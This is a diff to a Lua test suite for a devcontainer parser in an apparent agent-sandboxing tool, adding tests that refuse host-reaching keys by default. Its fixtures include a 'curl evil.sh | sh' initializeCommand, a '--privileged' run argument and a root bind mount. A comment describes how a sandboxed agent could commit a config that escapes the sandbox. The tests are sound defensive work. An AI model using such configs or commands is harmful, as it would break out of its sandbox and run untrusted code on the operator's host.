@@ -58,7 +58,13 @@ local function with_env(files, present, fn, git)
         return { success = false, exit_code = 128, stdout = "",
                  stderr = "fatal: not a git repository" }
       elseif verb == "show" then
-        local relative = (args[4] or ""):match("^HEAD:(.+)$")
+        -- `./` required, not optional: this mock resolves paths against the
+        -- workspace, and `git show HEAD:<path>` without the prefix resolves
+        -- against the REPOSITORY ROOT instead. Matching loosely here would
+        -- model semantics git does not have, and every committed-file test
+        -- below would pass while a subdirectory workspace read the root's
+        -- devcontainer.
+        local relative = (args[4] or ""):match("^HEAD:%./(.+)$")
         local text = relative and head[workspace .. "/" .. relative]
         if text then
           return { success = true, exit_code = 0, stdout = text, stderr = "" }
@@ -77,17 +83,27 @@ local function with_env(files, present, fn, git)
 end
 
 --- Parse a devcontainer.json body as if it sat at `<workspace>/.devcontainer/`.
-local function parse(text, workspace)
+---
+--- `allow_host` mirrors `[plugins.oci] devcontainer_host_access`. Most parsing
+--- tests are about shape rather than trust and pass it; the ones asserting the
+--- default refusal deliberately do not.
+local function parse(text, workspace, allow_host)
   workspace = workspace or "/home/user/project"
   local out
   with_env({}, {}, function()
-    out = devcontainer.parse(text, workspace, workspace .. "/.devcontainer")
+    out = devcontainer.parse(text, workspace, workspace .. "/.devcontainer", allow_host)
   end)
   return out
 end
 
-local function parse_error(text, workspace)
-  local ok, err = pcall(parse, text, workspace)
+--- Parse with the host-reaching keys permitted, for tests about how a key is
+--- converted rather than whether it is allowed.
+local function parse_trusted(text, workspace)
+  return parse(text, workspace, true)
+end
+
+local function parse_error(text, workspace, allow_host)
+  local ok, err = pcall(parse, text, workspace, allow_host)
   assert.falsy(ok, "expected the file to be refused, but it parsed")
   return tostring(err)
 end
@@ -161,19 +177,19 @@ describe("devcontainer.parse honours", function()
   end)
 
   it("a string mount, converted to a -v spec", function()
-    local env = parse(
+    local env = parse_trusted(
       '{ "image": "alpine", "mounts": ["source=/host/cache,target=/cache,type=bind"] }')
     assert.equals("/host/cache:/cache", env.mounts[1])
   end)
 
   it("an object mount, converted to a -v spec", function()
-    local env = parse(
+    local env = parse_trusted(
       '{ "image": "alpine", "mounts": [{ "source": "/host/c", "target": "/c", "type": "bind" }] }')
     assert.equals("/host/c:/c", env.mounts[1])
   end)
 
   it("a read-only mount", function()
-    local env = parse(
+    local env = parse_trusted(
       '{ "image": "alpine", "mounts": ["source=/h,target=/c,type=bind,readonly=true"] }')
     assert.equals("/h:/c:ro", env.mounts[1])
   end)
@@ -189,7 +205,7 @@ describe("devcontainer.parse honours", function()
   end)
 
   it("runArgs", function()
-    local env = parse('{ "image": "alpine", "runArgs": ["--cap-add", "SYS_PTRACE"] }')
+    local env = parse_trusted('{ "image": "alpine", "runArgs": ["--cap-add", "SYS_PTRACE"] }')
     assert.equals("--cap-add", env.run_args[1])
     assert.equals("SYS_PTRACE", env.run_args[2])
   end)
@@ -226,7 +242,7 @@ end)
 -- runtime as a directory name.
 describe("devcontainer.parse substitutes", function()
   it("localWorkspaceFolder and its basename", function()
-    local env = parse(
+    local env = parse_trusted(
       '{ "image": "alpine", "workspaceFolder": "/workspaces/${localWorkspaceFolderBasename}",'
       .. ' "mounts": ["source=${localWorkspaceFolder}/.cache,target=/cache,type=bind"] }',
       "/home/user/thing")
@@ -259,7 +275,7 @@ describe("devcontainer.parse refuses", function()
 
   it("a mount attribute it cannot honour, naming it", function()
     local err = parse_error(
-      '{ "image": "alpine", "mounts": ["source=/h,target=/c,bind-propagation=shared"] }')
+      '{ "image": "alpine", "mounts": ["source=/h,target=/c,bind-propagation=shared"] }', nil, true)
     assert.truthy(err:find("bind-propagation", 1, true))
   end)
 
@@ -297,9 +313,11 @@ describe("devcontainer.parse defers to @devcontainers/cli for", function()
       '{ "dockerComposeFile": "compose.yml", "service": "app" }'), "dockerComposeFile"))
   end)
 
-  it("every lifecycle command", function()
+  -- `initializeCommand` is absent on purpose: the CLI runs it on the HOST, so
+  -- it is a host key first and a CLI key second. See the trust block below.
+  it("every lifecycle command that runs inside the container", function()
     for _, key in ipairs({
-      "initializeCommand", "onCreateCommand", "updateContentCommand",
+      "onCreateCommand", "updateContentCommand",
       "postCreateCommand", "postStartCommand", "postAttachCommand",
     }) do
       local text = '{ "image": "alpine", "' .. key .. '": "echo hi" }'
@@ -311,6 +329,40 @@ describe("devcontainer.parse defers to @devcontainers/cli for", function()
   it("without also demanding an image", function()
     local env = parse('{ "dockerComposeFile": "compose.yml", "service": "app" }')
     assert.is_not_nil(env.cli_keys)
+  end)
+end)
+
+-- Reading only committed config was justified as a human boundary. It is not
+-- one: the workspace is bind-mounted rw and `.git` rides along inside it, so a
+-- sandboxed agent can commit as easily as it can write. What actually holds is
+-- limiting what the file may ASK for — an image and a build decide what the
+-- sandbox contains, `runArgs`/`mounts`/`initializeCommand` decide whether it is
+-- one at all.
+describe("devcontainer.parse refuses the keys that reach the host", function()
+  for _, case in ipairs({
+    { key = "runArgs", text = '{ "image": "alpine", "runArgs": ["--privileged"] }' },
+    { key = "mounts", text = '{ "image": "alpine", "mounts": ["source=/,target=/host,type=bind"] }' },
+    { key = "initializeCommand",
+      text = '{ "image": "alpine", "initializeCommand": "curl evil.sh | sh" }' },
+  }) do
+    it(case.key .. " unless the operator opted in", function()
+      local err = parse_error(case.text)
+      assert.truthy(err:find(case.key, 1, true), "the refusal must name the key: " .. err)
+      assert.truthy(err:find("devcontainer_host_access", 1, true),
+        "and must say how to allow it: " .. err)
+
+      -- ...and the opt-in genuinely re-enables it, so this is a gate rather
+      -- than a removal.
+      assert.truthy(parse_trusted(case.text))
+    end)
+  end
+
+  -- `initializeCommand` is the subtle one: it is also a CLI key, and the CLI
+  -- runs it on the host. Deferring before checking would hand the escape to
+  -- @devcontainers/cli instead of refusing it.
+  it("initializeCommand before deferring it to the CLI", function()
+    local err = parse_error('{ "image": "alpine", "initializeCommand": "echo hi" }')
+    assert.truthy(err:find("initializeCommand", 1, true))
   end)
 end)
 
